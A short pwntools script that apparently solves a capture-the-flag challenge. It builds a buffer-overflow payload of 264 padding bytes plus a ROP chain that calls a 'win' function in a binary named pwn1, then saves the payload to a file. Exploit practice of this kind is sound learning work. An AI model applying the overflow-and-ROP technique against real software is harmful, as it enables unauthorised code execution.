from pwn import *

# Specify the arch
context.arch = "amd64"

# Load the executable
elf = ELF("./pwn1")

# Get the offset using pwn cyclic
offset = 264

# Create the ROP chain
rop = ROP(elf)
rop.call(elf.symbols['WINgardium_leviosa'])

# Create the payload
payload = b"A"*offset + rop.chain()

# Save the payload
f = open("exploit", "wb")
f.write(payload)
f.close()
